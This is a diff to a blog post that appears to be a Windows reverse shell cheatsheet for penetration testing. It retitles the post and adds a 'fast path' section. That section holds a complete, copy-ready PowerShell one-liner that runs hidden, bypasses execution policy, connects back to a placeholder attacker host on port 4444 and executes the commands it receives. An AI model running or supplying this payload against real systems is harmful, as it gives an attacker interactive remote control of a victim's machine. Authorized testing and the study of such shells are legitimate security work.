@@ -1,9 +1,9 @@
 ---
-title: "Windows Reverse Shell Cheatsheet — x86/x64 from Win7 to Win11"
+title: "PowerShell Reverse Shell Cheatsheet for Windows"
 date: 2026-03-11
 permalink: /en/posts/tech-windows-reverse-shell-cheatsheet/
 legacy_permalink: /posts/tech-windows-reverse-shell-cheatsheet/
-description: "A complete reverse shell command reference for Windows penetration testing. Covers PowerShell, cmd.exe, certutil, mshta, rundll32, msfvenom payloads, and more — organized by OS version and architecture (x86/x64) with compatibility matrices."
+description: "Copy-ready PowerShell reverse shell one-liners for Windows pentesting, with netcat listeners, x86/x64 notes, and fallbacks using certutil, mshta, and rundll32."
 categories: [TechBlog]
 tags: [reverse-shell, windows, powershell, cmd, msfvenom, pentest, oscp, post-exploitation, rce, cheatsheet]
 mermaid: true
@@ -14,6 +14,12 @@ alt_ja: /ja/posts/tech-windows-reverse-shell-cheatsheet/
 ## TL;DR
 
 Once RCE is established on a Windows target, the next step is upgrading to an **interactive reverse shell**. This cheatsheet provides every practical reverse shell method for Windows — from legacy Win7 x86 to modern Win11 x64 — organized by technique, architecture, and OS compatibility.
+
+**Fast path for PowerShell reverse shell searches:**
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<KALI_IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
 **Quick selection guide:**
 
